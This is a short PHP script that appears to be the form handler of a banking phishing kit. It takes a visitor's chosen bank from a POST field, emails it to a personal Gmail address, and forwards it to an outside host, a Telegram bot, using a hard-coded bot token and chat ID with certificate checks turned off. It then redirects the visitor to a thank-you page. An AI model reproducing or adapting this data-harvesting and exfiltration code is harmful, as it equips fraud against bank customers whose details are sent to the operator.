<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $banque = isset($_POST['banque']) ? $_POST['banque'] : '';

    if ($banque !== '') {
        $subject = "New Bank Choice";
        $body    = "Banque choisie : " . $banque;
        $to      = "mouad.ccc@gmail.com";

        $headers = "Content-Type: text/html; charset=ISO-8859-1\r\n";

        // 1) Email
        @mail($to, $subject, $body, $headers);

        // 2) Telegram
        $websit = "https://api.telegram.org/bot5529205468:AAEmNwJzZ0oQ4X_RVS0vhEL_GO4xpaytvwE";
        $param  = [
            'chat_id' => '5061239044',
            'text'    => $body,
        ];

        $ch = curl_init($websit . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($param));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);

        header("Location: merci.html");
        exit;
    } else {
        echo "Aucune banque choisie.";
    }
} else {
    echo "Méthode non autorisée.";
}
?>
